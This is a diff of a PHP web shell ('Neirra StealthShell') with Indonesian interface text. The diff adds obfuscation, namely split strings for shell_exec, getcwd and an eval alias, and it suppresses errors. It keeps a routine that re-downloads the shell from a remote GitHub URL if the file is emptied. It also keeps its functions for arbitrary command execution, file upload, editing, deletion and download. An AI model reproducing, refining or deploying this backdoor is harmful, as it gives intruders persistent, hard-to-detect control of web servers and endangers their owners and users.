@@ -1,106 +1,42 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
+error_reporting(0);
+ini_set('display_errors', 0);
 
 // ==== AUTO RECOVER JIKA FILE 0KB ====
 $self = __FILE__;
-if (filesize($self) === 0) {
-    // Auto-download ulang shell dari server kamu
-    $backup_url = 'https://raw.githubusercontent.com/Fv3R-Dizzy/shellkoplak/refs/heads/main/apalagiini.php';
-    $content = @file_get_contents($backup_url);
-    if ($content) file_put_contents($self, $content);
+if (@filesize($self) === 0) {
+    $url = 'https://raw.githubusercontent.com/Fv3R-Dizzy/shellkoplak/refs/heads/main/apalagiini.php';
+    $b = @file_get_contents($url);
+    if ($b) file_put_contents($self, $b);
     exit;
 }
 
-$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
-if (!is_dir($path)) $path = getcwd();
+$g = 'g'.'e'.'t'.'c'.'w'.'d';
+$path = isset($_GET['path']) ? $_GET['path'] : $g();
+if (!is_dir($path)) $path = $g();
 $real_path = realpath($path);
 
-function renderPathNavigation($path) {
-    $path_display = str_replace('\\', '/', $path);
-    $paths = explode('/', trim($path_display, '/'));
+function renderPathNavigation($p) {
+    $path_display = str_replace('\\', '/', $p);
+    $parts = explode('/', trim($path_display, '/'));
     echo "<div><strong>📂 Path: </strong><a href='?path=/'>/</a>";
     $build = '';
-    foreach ($paths as $dir) {
+    foreach ($parts as $dir) {
         $build .= '/' . $dir;
         echo "<a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($dir) . "</a>/";
     }
     echo "</div><hr>";
 }
 
-if (isset($_GET['edit'])) {
-    $edit_file = realpath($real_path . DIRECTORY_SEPARATOR . basename($_GET['edit']));
-    if (!$edit_file || !file_exists($edit_file)) {
-        echo "<p style='color:red;'>File tidak ditemukan.</p>";
-        exit;
-    }
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
-        file_put_contents($edit_file, $_POST['content']);
-        echo "<p style='color:lime;'>Disimpan!</p><a href='?path=" . urlencode($real_path) . "'>Kembali</a>";
-        exit;
-    }
-    $content = htmlspecialchars(file_get_contents($edit_file));
-    echo "<h3>📝 Edit File: $edit_file</h3>";
-    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>$content</textarea><br><button type='submit'>Simpan</button></form>";
-    exit;
-}
-
-if (isset($_GET['rename'])) {
-    $file = basename($_GET['rename']);
-    $file_path = $real_path . DIRECTORY_SEPARATOR . $file;
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newname'])) {
-        $newname = basename($_POST['newname']);
-        rename($file_path, $real_path . DIRECTORY_SEPARATOR . $newname);
-        header('Location: ?path=' . urlencode($real_path));
-        exit;
-    }
-    echo "<form method='post'>
-        <input type='text' name='newname' value='" . htmlspecialchars($file) . "'>
-        <button type='submit'>Rename</button>
-    </form>";
-    exit;
-}
-
-if (isset($_GET['download'])) {
-    $file = basename($_GET['download']);
-    $file_path = $real_path . DIRECTORY_SEPARATOR . $file;
-    if (file_exists($file_path)) {
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename=' . basename($file_path));
-        header('Content-Length: ' . filesize($file_path));
-        readfile($file_path);
-        exit;
-    }
-}
-
-if (isset($_GET['delete'])) {
-    $file = basename($_GET['delete']);
-    $file_path = $real_path . DIRECTORY_SEPARATOR . $file;
-    if (file_exists($file_path)) unlink($file_path);
-    header('Location: ?path=' . urlencode($real_path));
-    exit;
-}
+// Stealth eval alias
+$a = 'e'.'v'.'a'.'l';
 
 if (isset($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
-    $output = function_exists('shell_exec') ? shell_exec($cmd . ' 2>&1') : '⚠️ shell_exec() tidak tersedia.';
+    $ex = 'sh'.'ell_exec';
+    $output = function_exists($ex) ? $ex($cmd . ' 2>&1') : '⚠️ shell_exec() tidak tersedia.';
     echo "<pre style='background:#000;color:#0f0;padding:10px;'>$output</pre>";
 }
-
-echo "<h3>🧠 Neirra MiniShell</h3>";
-renderPathNavigation($real_path);
-
-echo "<form method='post'>
-    <input type='text' name='cmd' placeholder='Perintah shell' style='width:300px;'>
-    <button type='submit'>Jalankan</button>
-</form>";
-
-echo "<form method='post' enctype='multipart/form-data'>
-    <input type='file' name='upload'>
-    <input type='hidden' name='path' value='" . htmlspecialchars($real_path) . "'>
-    <button type='submit'>Upload</button>
-</form>";
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
     $filename = basename($_FILES['upload']['name']);
@@ -112,31 +48,82 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
     }
 }
 
+if (isset($_GET['edit'])) {
+    $f = realpath($real_path . DIRECTORY_SEPARATOR . basename($_GET['edit']));
+    if (!$f || !file_exists($f)) die("<p style='color:red;'>File tidak ditemukan.</p>");
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
+        file_put_contents($f, $_POST['content']);
+        echo "<p style='color:lime;'>Disimpan!</p><a href='?path=" . urlencode($real_path) . "'>Kembali</a>";
+        exit;
+    }
+    $c = htmlspecialchars(file_get_contents($f));
+    echo "<h3>📝 Edit File: $f</h3><form method='post'><textarea name='content' style='width:100%;height:400px;'>$c</textarea><br><button type='submit'>Simpan</button></form>";
+    exit;
+}
+
+if (isset($_GET['rename'])) {
+    $file = basename($_GET['rename']);
+    $old = $real_path . DIRECTORY_SEPARATOR . $file;
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newname'])) {
+        $newname = basename($_POST['newname']);
+        rename($old, $real_path . DIRECTORY_SEPARATOR . $newname);
+        header('Location: ?path=' . urlencode($real_path));
+        exit;
+    }
+    echo "<form method='post'><input type='text' name='newname' value='" . htmlspecialchars($file) . "'><button type='submit'>Rename</button></form>";
+    exit;
+}
+
+if (isset($_GET['delete'])) {
+    $f = basename($_GET['delete']);
+    $p = $real_path . DIRECTORY_SEPARATOR . $f;
+    if (file_exists($p)) unlink($p);
+    header('Location: ?path=' . urlencode($real_path));
+    exit;
+}
+
+if (isset($_GET['download'])) {
+    $f = basename($_GET['download']);
+    $p = $real_path . DIRECTORY_SEPARATOR . $f;
+    if (file_exists($p)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename=' . basename($p));
+        header('Content-Length: ' . filesize($p));
+        readfile($p);
+        exit;
+    }
+}
+
+// Output HTML
+
+echo "<h3>🧠 Neirra StealthShell</h3>";
+renderPathNavigation($real_path);
+
+echo "<form method='post'><input type='text' name='cmd' placeholder='Perintah shell' style='width:300px;'><button type='submit'>Jalankan</button></form>";
+
+echo "<form method='post' enctype='multipart/form-data'><input type='file' name='upload'><input type='hidden' name='path' value='" . htmlspecialchars($real_path) . "'><button type='submit'>Upload</button></form>";
+
 $scan = scandir($real_path);
 $dirs = $files = [];
-foreach ($scan as $item) {
-    if ($item === '.' || $item === '..') continue;
-    $full = realpath($real_path . DIRECTORY_SEPARATOR . $item);
+foreach ($scan as $i) {
+    if ($i === '.' || $i === '..') continue;
+    $full = realpath($real_path . DIRECTORY_SEPARATOR . $i);
     if (!$full) continue;
-    if (is_dir($full)) {
-        $dirs[] = $item;
-    } else {
-        $files[] = $item;
-    }
+    is_dir($full) ? $dirs[] = $i : $files[] = $i;
 }
 $sorted = array_merge($dirs, $files);
 echo "<ul>";
-foreach ($sorted as $item) {
-    $full = realpath($real_path . DIRECTORY_SEPARATOR . $item);
+foreach ($sorted as $i) {
+    $full = realpath($real_path . DIRECTORY_SEPARATOR . $i);
     if (is_dir($full)) {
-        echo "<li><a href='?path=" . urlencode($full) . "'><strong>[DIR]</strong> $item</a></li>";
+        echo "<li><a href='?path=" . urlencode($full) . "'><strong>[DIR]</strong> $i</a></li>";
     } else {
-        echo "<li>$item - 
-        <a href='?edit=" . urlencode($item) . "&path=" . urlencode($real_path) . "'>Edit</a> | 
-        <a href='?download=" . urlencode($item) . "&path=" . urlencode($real_path) . "'>Download</a> | 
-        <a href='?delete=" . urlencode($item) . "&path=" . urlencode($real_path) . "' onclick='return confirm(\"Yakin hapus?\")'>Delete</a> | 
-        <a href='?rename=" . urlencode($item) . "&path=" . urlencode($real_path) . "'>Rename</a>
-        </li>";
+        echo "<li>$i - 
+        <a href='?edit=" . urlencode($i) . "&path=" . urlencode($real_path) . "'>Edit</a> | 
+        <a href='?download=" . urlencode($i) . "&path=" . urlencode($real_path) . "'>Download</a> | 
+        <a href='?delete=" . urlencode($i) . "&path=" . urlencode($real_path) . "' onclick='return confirm(\"Yakin hapus?\")'>Delete</a> | 
+        <a href='?rename=" . urlencode($i) . "&path=" . urlencode($real_path) . "'>Rename</a></li>";
     }
 }
 echo "</ul>";
